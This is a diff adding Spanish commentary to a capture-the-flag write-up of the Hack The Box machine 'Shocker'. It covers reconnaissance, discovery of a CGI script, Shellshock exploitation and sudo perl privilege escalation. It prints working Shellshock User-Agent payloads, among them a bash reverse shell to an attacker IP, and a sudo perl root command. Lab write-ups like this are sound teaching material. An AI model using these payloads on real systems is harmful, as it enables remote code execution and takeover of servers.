@@ -15,7 +15,15 @@ layout:
 
 # Shocker
 
+`Shocker`, aunque bastante simple en general, demuestra la gravedad del famoso exploit Shellshock, que afectó a millones de servidores públicos.
 
+<figure><img src="../../.gitbook/assets/Shocker.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Shocker**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.56 -oG allPorts
@@ -39,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
            Raw packets sent: 71016 (3.125MB) | Rcvd: 70953 (2.839MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -52,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache` y un servicio `SSH`.
 
 ```bash
 ❯ nmap -sCV -p80,2222 10.10.10.56 -A -oN targeted -oX targetedXML
@@ -86,9 +94,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
 ```
 
-
-
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -97,24 +103,24 @@ Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
-
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/4929_vmware_S0bllxIv6F.png" alt=""><figcaption></figcaption></figure>
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb http://10.10.10.56
 http://10.10.10.56 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56]
 ```
 
+Al acceder a [http://10.10.10.56](http://10.10.10.56) nos encontramos con el siguiente contenido de la página web.
 
+<figure><img src="../../.gitbook/assets/imagen (10).png" alt="" width="421"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>
-
-
+Realizamos una enumeración básica de directorios y páginas y no logramos obtener ninguna información al respecto.
 
 ```bash
 ❯ dirsearch -u 'http://10.10.10.56/' -t 50 -i 200 2>/dev/null
@@ -133,26 +139,7 @@ Target: http://10.10.10.56/
 Task Completed
 ```
 
-
-
-
-
-```bash
-❯ cat targeted -l java
-# Nmap 7.95 scan initiated Thu Feb 13 20:29:10 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p80,2222 -A -oN targeted -oX targetedXML 10.10.10.56
-Nmap scan report for 10.10.10.56
-Host is up (0.075s latency).
-
-PORT     STATE SERVICE VERSION
-80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Site doesn't have a title (text/html).
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-```
-
-
-
-
+Realizamos nuevamente una enumeración de páginas con extensión `html` y `php` pero tampoco logramos obtener información relevante.
 
 ```bash
 ❯ feroxbuster -u http://10.10.10.56 -x html,php
@@ -181,7 +168,13 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 200      GET        9l       13w      137c http://10.10.10.56/index.html
 ```
 
+A través del parámetro `-f` lo que le indicamos a `Feroxbuster` de añadir un slash `/` al final de cada petición que se realiza, esto debido que posiblemente podamos encontrar más información de posibles directorios.
 
+En el resultado obtenido, logramos enumerar el directorio `/cgi-bin/`.
+
+{% hint style="info" %}
+Los servidores web suelen tener un directorio CGI-bin/ en la base de su árbol de directorios para almacenar archivos ejecutables llamados CGI. Un CGI-bin es un directorio especial designado en los archivos de configuración de un servidor web para permitir la ejecución de scripts CGI en directorios específicos.
+{% endhint %}
 
 ```bash
 ❯ feroxbuster -u http://10.10.10.56 -f -n --status-codes 200,403 --dont-filter
@@ -213,9 +206,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 403      GET       11l       32w      300c http://10.10.10.56/server-status/
 ```
 
-
-
-
+Realizaremos una búsqueda de archivos ejecutables que se puedan encontrar en el directorio `/cgi-bin/`. Finalmente logramos enumerar un archivo llamado`user.sh`.
 
 ```bash
 ❯ feroxbuster -u http://10.10.10.56/cgi-bin/ -x sh,cgi,pl,txt,php
@@ -245,13 +236,39 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 
 
+## Initial Access
+
+### ShelShock Attack (User-Agent) \[CVE-2014-6271]
+
+Accederemos a [http://10.10.10.56/cgi-bin/user.sh](http://10.10.10.56/cgi-bin/user.sh) y visualizamos el contenido del script.
+
 <figure><img src="../../.gitbook/assets/imagen (349).png" alt=""><figcaption></figcaption></figure>
 
+El endpoint `/cgi-bin/user.sh` está ejecutando un script en el servidor y devolviendo su salida.
 
+**Análisis de la respuesta:**
+
+* **Content-Type: text/x-sh** → El servidor está sirviendo un archivo de script de shell (`.sh`).
+* **Just an uptime test script** → Mensaje que indica que el script solo muestra el uptime del sistema.
+* **19:11:10 up 5 min, 0 users, load average: 0.00, 0.03, 0.01** → Resultado del comando `uptime`, lo que sugiere que el script ejecuta comandos del sistema.
+
+<figure><img src="../../.gitbook/assets/imagen (360).png" alt=""><figcaption></figcaption></figure>
+
+Si el servidor ejecuta el script sin restricciones, podríamos probar **Shellshock** o **command injection** enviando una carga en la cabecera `User-Agent` o como parámetro en la URL.
+
+Shellshock (CVE-2014-6271) es una vulnerabilidad en **Bash** que permite ejecutar comandos arbitrarios a través de variables de entorno manipuladas. Se explota inyectando código malicioso en cabeceras HTTP o parámetros de CGI cuando el servidor usa Bash para ejecutar scripts.
+
+{% hint style="danger" %}
+GNU Bash hasta la versión 4.3 procesa las cadenas finales después de las definiciones de funciones en los valores de las variables de entorno, lo que permite a atacantes remotos ejecutar código arbitrario a través de un entorno diseñado, como lo demuestran los vectores que involucran la característica ForceCommand en OpenSSH sshd, los módulos mod\_cgi y mod\_cgid en el servidor HTTP Apache, scripts ejecutados por clientes DHCP no especificados y otras situaciones en las que la configuración del entorno ocurre a través de un límite de privilegios desde la ejecución de Bash, también conocido como "ShellShock". NOTA: la solución original para este problema era incorrecta; CVE-2014-7169 se ha asignado para cubrir la vulnerabilidad que aún está presente después de la solución incorrecta.
+{% endhint %}
+
+{% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2014-6271" %}
+
+Nos encontramos con el siguiente repositorio de GitHub que nos mostraba un simple PoC de cómo intentar explotar el `ShellShock`.
 
 {% embed url="https://github.com/b4keSn4ke/CVE-2014-6271/" %}
 
-
+Modificaremos el encabezado de `User-Agent` para inyectarle el siguiente código malicioso. Verificamos que en la respuesta por parte del servidor, hemos logrado la ejecución de comandos.
 
 ```bash
 User-Agent: () { :; }; echo; /usr/bin/id
@@ -259,16 +276,14 @@ User-Agent: () { :; }; echo; /usr/bin/id
 
 <figure><img src="../../.gitbook/assets/4933_vmware_DKMYqW3eGe.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+El siguiente paso, será lograr obtener una Reverse Shell para acceder al sistema. Nos pondremos en escucha con `nc`.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Inyectaremos el siguiente código malicioso en el `User-Agent` para establecernos la Reverse Shell.
 
 ```bash
 User-Agent: () { :; }; /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1
@@ -276,7 +291,7 @@ User-Agent: () { :; }; /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1
 
 <figure><img src="../../.gitbook/assets/4934_vmware_ERbzQkZKr1.png" alt=""><figcaption></figcaption></figure>
 
-
+Verificaremos que logramos acceder al sistema y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -285,10 +300,14 @@ connect to [10.10.16.7] from (UNKNOWN) [10.10.10.56] 42186
 script /dev/null -c bash
 Script started, file is /dev/null
 shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt 
-2283b57fd1d301901247600722f55fbd
+2283b57fd1d3********************
 ```
 
+## Privilege Escalation
 
+### Abusing sudoers privilege (perl)
+
+Revisaremos los grupos a los que forma parte el usuario `shelly`. Por otro lado, al verificar si disponíamos de permisos de `sudoers`, nos encontramos que tenemos la capacidad de ejecutar como `sudo` sin proporcionar credenciales el binario de `/usr/bin/perl`.
 
 ```bash
 shelly@Shocker:/usr/lib/cgi-bin$ id
@@ -301,11 +320,11 @@ User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
 ```
 
-
-
-
+En la página de `GTFOBins` podemos encontrar diferentes maneras de cómo abusar de privilegios de binarios con `sudoers`. Nos encontramos la respectiva entrada del binario `perl`.
 
 {% embed url="https://gtfobins.github.io/gtfobins/perl/#sudo" %}
+
+También, podemos realizar la misma consulta a través de la siguiente herramienta de `searchbins` que realiza la consulta de `GTFOBins` desde la misma terminal.
 
 {% embed url="https://github.com/r1vs3c/searchbins" %}
 
@@ -320,12 +339,10 @@ User shelly may run the following commands on Shocker:
 	| sudo perl -e 'exec "/bin/sh";'
 ```
 
-
-
-
+Realizamos la ejecución del comando que se nos proporciona en `GTFOBins` y finalmente logramos abusar del binario `/usr/bin/perl` como `sudo` y logramos el acceso a `root`. Finalmente, comprobamos la flag de **root.txt**.
 
 ```bash
 shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash";'  
 root@Shocker:/usr/lib/cgi-bin# cat /root/root.txt 
-47fd73a7751770c8a757132aebe0ba0d
+47fd73a775177*******************
 ```
